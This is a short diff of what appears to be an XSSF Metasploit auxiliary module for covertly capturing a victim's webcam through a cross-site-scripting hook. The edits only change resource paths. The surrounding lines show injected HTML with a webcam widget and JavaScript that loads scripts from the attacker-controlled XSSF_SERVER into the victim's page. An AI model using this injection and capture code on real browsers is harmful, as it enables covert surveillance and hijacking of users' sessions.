@@ -31,8 +31,8 @@ class Metasploit3 < Msf::Auxiliary
 			code = %Q{
 				<html>
 					<head>
-						<script type="text/javascript" src="jquery.js"></script>
-						<script type="text/javascript" src="jquery.webcam.js"></script>
+						<script type="text/javascript" src="resources/jquery.js"></script>
+						<script type="text/javascript" src="resources/jquery.webcam.js"></script>
 						
 						<style type="text/css">
 							#webcam, #canvas#{random} { 	width: 320px; 	border:20px solid #333; 	background:#eee; 	-webkit-border-radius: 20px; 	-moz-border-radius: 20px; border-radius: 20px; }
@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
 								width: 320,
 								height: 240,
 								mode: "callback",
-								swffile: "/jscam.swf",
+								swffile: "resources/jscam.swf",
 
 
 								onSave: function(data) {
@@ -127,7 +127,7 @@ class Metasploit3 < Msf::Auxiliary
 			
 			code = %Q{
 				s = document.createElement('script');
-				s.src = XSSF_SERVER + "jquery.js";
+				s.src = XSSF_SERVER + "resources/jquery.js";
 				document.body.appendChild(s);
 
 				s = document.createElement('style');
@@ -153,7 +153,7 @@ class Metasploit3 < Msf::Auxiliary
 			
 				function func1() {
 					s = document.createElement('script');
-					s.src = XSSF_SERVER + "jquery.simplemodal.js";
+					s.src = XSSF_SERVER + "resources/jquery.simplemodal.js";
 					document.body.appendChild(s);
 				}
 
